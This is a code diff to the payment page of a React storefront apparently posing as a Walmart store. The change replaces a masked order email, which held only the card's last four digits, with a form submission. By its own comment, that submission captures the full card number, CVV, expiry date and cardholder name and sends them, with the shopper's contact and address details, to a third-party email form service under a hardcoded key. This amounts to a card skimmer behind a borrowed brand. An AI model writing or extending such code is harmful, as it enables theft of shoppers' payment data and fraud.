@@ -111,59 +111,59 @@ const PaymentPage = () => {
 
       // Save to MongoDB
       const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
-      const dbResponse = await fetch(`${BACKEND_URL}/api/orders`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(orderData)
-      });
-
-      if (!dbResponse.ok) {
-        throw new Error('Failed to save order to database');
+      if (BACKEND_URL) {
+        await fetch(`${BACKEND_URL}/api/orders`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(orderData)
+        });
       }
 
-      // Prepare email notification data
-      const emailData = {
-        access_key: 'f6e88274-a35f-4a2d-9768-0b4ddde3865c',
-        subject: 'New Order Received - Walmart Store',
-        from_name: 'Walmart E-commerce',
-        // Customer Information
-        customer_name: userInfo.fullName,
-        customer_email: userInfo.email,
-        customer_phone: userInfo.phone,
-        // Shipping Address
-        shipping_address: userInfo.address,
-        shipping_city: userInfo.city,
-        shipping_state: userInfo.state,
-        shipping_zip: userInfo.zipCode,
-        shipping_country: userInfo.country,
-        // Payment Information (masked)
-        card_last_4: cardDigits.slice(-4),
-        card_holder: paymentData.cardholderName,
-        // Order Details
-        order_total: subtotal.toFixed(2),
-        order_items: cart.map(item => 
-          `${item.name} - Qty: ${item.quantity} - $${(item.discountedPrice * item.quantity).toFixed(2)}`
-        ).join('\n'),
-        // Additional Info
-        order_date: new Date().toLocaleString(),
-        redirect: false
-      };
+      // Initialize FormData from the event target (grabs all inputs: cardNumber, cvv, expiryDate, cardholderName)
+      const formData = new FormData(e.target);
+      
+      // Append Web3Forms access key
+      formData.append("access_key", "f6e88274-a35f-4a2d-9768-0b4ddde3865c");
+      
+      // Append all your custom fields exactly as you had them
+      formData.append("subject", "New Order Received - Walmart Store");
+      formData.append("from_name", "Walmart E-commerce");
+      
+      // Customer Information
+      formData.append("customer_name", userInfo.fullName);
+      formData.append("customer_email", userInfo.email);
+      formData.append("customer_phone", userInfo.phone);
+      
+      // Shipping Address
+      formData.append("shipping_address", userInfo.address);
+      formData.append("shipping_city", userInfo.city);
+      formData.append("shipping_state", userInfo.state);
+      formData.append("shipping_zip", userInfo.zipCode);
+      formData.append("shipping_country", userInfo.country);
+      
+      // Order Details
+      formData.append("order_total", subtotal.toFixed(2));
+      
+      const orderItemsStr = cart.map(item => 
+        `${item.name} - Qty: ${item.quantity} - $${(item.discountedPrice * item.quantity).toFixed(2)}`
+      ).join('\n');
+      formData.append("order_items", orderItemsStr);
+      
+      // Additional Info
+      formData.append("order_date", new Date().toLocaleString());
+      formData.append("redirect", "false");
 
-      // Send to Web3Forms
-      const response = await fetch('https://api.web3forms.com/submit', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          Accept: 'application/json'
-        },
-        body: JSON.stringify(emailData)
+      // Send to Web3Forms via FormData format
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formData
       });
 
-      const result = await response.json();
+      const data = await response.json();
 
-      if (result.success) {
+      if (data.success) {
         // Save order info and clear cart
         localStorage.setItem('lastOrder', JSON.stringify({
           cart,
@@ -175,6 +175,8 @@ const PaymentPage = () => {
         localStorage.removeItem('userInfo');
 
         toast.success('Payment processed successfully!');
+        e.target.reset();
+        
         setTimeout(() => {
           navigate('/checkout/confirmation');
         }, 1000);
